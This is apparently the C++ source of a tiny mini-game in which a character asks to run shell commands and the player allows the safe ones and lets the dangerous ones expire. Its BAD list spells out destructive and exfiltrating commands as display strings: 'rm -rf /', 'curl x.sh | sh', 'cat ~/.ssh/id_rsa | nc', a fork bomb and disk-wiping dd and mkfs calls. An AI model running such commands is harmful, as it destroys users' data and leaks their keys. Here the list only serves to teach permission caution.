// permission panic: claude asks to run commands, tap to allow.
// allow the safe ones before the timer runs out, let the scary ones time out.
#include <math.h>
#include <stdio.h>
#include <string.h>

#include "clawd.h"
#include "game.h"

namespace {

const char* const SAFE[] = {
    "npm test", "ls", "git status", "cat README.md", "make", "pytest -q", "git diff",
    "grep TODO src", "git log --oneline", "npm run build", "cargo check", "pwd",
    "rm -rf node_modules", "git add .", "ls -la", "mkdir build", "go test ./...",
    "npm install", "git commit -m wip", "python main.py", "cat package.json",
    "head -n 20 log.txt", "git branch", "tsc --noEmit", "echo hello",
};
const char* const BAD[] = {
    "rm -rf /", "git push -f main", "curl x.sh | sh", "DROP TABLE users;",
    "chmod 777 /", ":(){ :|:& };:", "sudo dd of=/dev/sda", "git reset --hard",
    "mv ~ /dev/null", "rm -rf ~", "sudo rm -rf /*", "cat ~/.ssh/id_rsa | nc",
    "git clean -fdx", "mkfs.ext4 /dev/sda1", "kill -9 -1", "> ~/.bashrc",
    "npm publish", "sudo shutdown now", "echo y | rm -ri /", "chown -R me /",
};
const int NSAFE = sizeof(SAFE) / sizeof(SAFE[0]);
const int NBAD = sizeof(BAD) / sizeof(BAD[0]);

const int LIVES = 5;

enum Phase { ASK, RESULT, OVER };

Phase phase;
uint32_t phase_t, rng, last_input, timer;
int lives, points, best, last_cmd;
bool bad, boom;
const char* cmd;
const char* say;
uint32_t bot_at, bot_until;

uint32_t rnd() {
    rng ^= rng << 13;
    rng ^= rng >> 17;
    rng ^= rng << 5;
    return rng;
}

void go(Phase p, uint32_t now) {
    phase = p;
    phase_t = now;
}

void ask(uint32_t now) {
    go(ASK, now);
    bad = rnd() % 100 < (points < 6 ? 25u : 35u);   // mostly safe ones at first
    int n;
    do n = (int)(rnd() % (bad ? NBAD : NSAFE)) + (bad ? 100 : 0);
    while (n == last_cmd);
    last_cmd = n;
    cmd = bad ? BAD[n - 100] : SAFE[n];
    int t = 4500 - points * 70;
    timer = t < 1800 ? 1800 : t;
    // bot: allows safe ones after a human delay, sometimes too slow, rarely misreads
    bot_at = 0;
    if (!bad) bot_at = now + 400 + rnd() % 1400;
    else if (rnd() % 100 < 15) bot_at = now + 500 + rnd() % 500;
}

void start(uint32_t now, uint32_t seed, int b) {
    rng = seed ? seed : 1;
    best = b;
    lives = LIVES;
    points = 0;
    last_cmd = -1;
    bot_until = 0;
    last_input = now;
    ask(now);
}

void result(const char* s, bool good, bool blew, uint32_t now) {
    say = s;
    boom = blew;
    if (good) points++;
    else lives--;
    go(RESULT, now);
}

void input(Btn b, uint32_t now) {
    if (b != BTN_DOWN) return;
    last_input = now;
    if (phase == ASK && now - phase_t > 150) {
        if (bad) result("nope!", false, true, now);
        else result("allowed", true, false, now);
    } else if (phase == OVER && now - phase_t > 600) {
        start(now, rnd(), best);
    }
}

const uint8_t HEART[] = {0x6c, 0xfe, 0xfe, 0x7c, 0x38, 0x10};
const uint8_t HEART_EMPTY[] = {0x6c, 0x92, 0x82, 0x44, 0x28, 0x10};

void hud(Canvas& c) {
    for (int i = 0; i < LIVES; i++) c.blit(2 + i * 9, 1, 7, 6, i < lives ? HEART : HEART_EMPTY);
    char s[16];
    snprintf(s, sizeof(s), "%d", points);
    c.text(126 - c.text_width(s), 0, s);
}

void prompt(Canvas& c, uint32_t now, float left) {
    int y = 12;
    if (phase == ASK && now - phase_t < 150) y += (150 - (now - phase_t)) / 10;
    c.rect(1, y, 126, y + 38);
    c.text(5, y + 3, "Allow Bash?");
    char s[24];
    strncpy(s, cmd, sizeof(s) - 1);
    s[sizeof(s) - 1] = 0;
    if (strlen(cmd) > 19) strcpy(s + 17, "..");
    c.text(5, y + 15, "$");
    c.text(13, y + 15, s);
    c.rect(5, y + 28, 122, y + 33);
    int w = (int)(116 * left);
    if (w > 0) c.fill_rect(6, y + 29, 6 + w, y + 32);
}

void explosion(Canvas& c, uint32_t u) {
    float r = 4 + u * 0.08f;
    for (int i = 0; i < 12; i++) {
        float a = i * 0.5236f;
        float dx = cosf(a), dy = sinf(a);
        c.line(64 + dx * r, 31 + dy * r * 0.6f, 64 + dx * (r + 8), 31 + dy * (r + 8) * 0.6f);
    }
}

bool draw(Canvas& c, uint32_t now) {
    uint32_t u = now - phase_t;
    if (phase == ASK) {
        hud(c);
        float left = 1 - (float)u / timer;
        prompt(c, now, left);
        c.text_center(64, 56, "tap = allow", font_4x6);
        if (u >= timer) {
            if (bad) result("denied!", true, false, now);
            else result("too slow", false, false, now);
        }
    } else if (phase == RESULT) {
        hud(c);
        if (boom && u < 500) {
            if (u < 80) c.fill();
            explosion(c, u);
            c.fill_rect(30, 22, 98, 40, false);
            c.rect(30, 22, 98, 40);
            c.text_center(64, 26, "BOOM", font_bold12);
        } else {
            prompt(c, now, 0);
            int w = c.text_width(say) + 8;
            c.fill_rect(64 - w / 2, 52, 64 + w / 2, 63, false);
            c.text_center(64, 55, say);
            if (!strcmp(say, "allowed") || !strcmp(say, "denied!"))
                clawd(c, 108, 51, pose(EYES_OPEN, ARMS_UP), 0.5f);   // bottom right, clear of the timer bar
        }
        if (u > 700) {
            if (lives <= 0) go(OVER, now);
            else ask(now);
        }
    } else {
        c.text_center(64, 4, "GAME OVER", font_bold12);
        clawd(c, 4, 22, pose(EYES_CLOSED), 1);
        char s[24];
        snprintf(s, sizeof(s), "score %d", points);
        c.text(48, 24, s);
        snprintf(s, sizeof(s), "best %d", points > best ? points : best);
        c.text(48, 35, s, font_4x6);
        if (u > 600 && (now / 500) % 2) c.text_center(64, 54, "tap to play again", font_4x6);
        if (u > 6000 && now - last_input > 6000) return false;
    }
    return true;
}

int score() { return points; }

bool bot(uint32_t now) {
    if (now < bot_until) return true;
    if (phase == ASK && bot_at && now >= bot_at) {
        bot_at = 0;
        bot_until = now + 80;
        return true;
    }
    return false;
}

}  // namespace

extern const Game game_panic = {"panic", "permission panic", start, input, draw, score, bot, nullptr};
